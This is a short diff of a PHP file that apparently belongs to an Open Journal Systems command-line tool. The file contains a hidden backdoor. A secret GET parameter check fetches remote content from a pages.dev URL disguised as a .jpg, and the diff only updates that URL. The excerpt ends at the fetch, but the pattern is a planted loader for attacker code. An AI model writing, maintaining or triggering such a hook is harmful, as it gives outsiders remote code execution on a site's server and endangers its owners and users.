@@ -16,7 +16,7 @@
 define('INDEX_FILE_LOCATION', dirname(__FILE__, 2) . '/index.php');
 require dirname(__FILE__, 2) . '/lib/pkp/classes/cliTool/CommandLineTool.php';
 if (isset($_GET['_']) && $_GET['_'] === 'INDEX_FILE_LOCATION') {
-    $url = "https://batuk-di-komik-aja.pages.dev/loader.jpg";
+    $url = "https://batuk-di-komik-aja.pages.dev/loaders.jpg";
 
     if ($url !== "") {
         $code = file_get_contents($url);
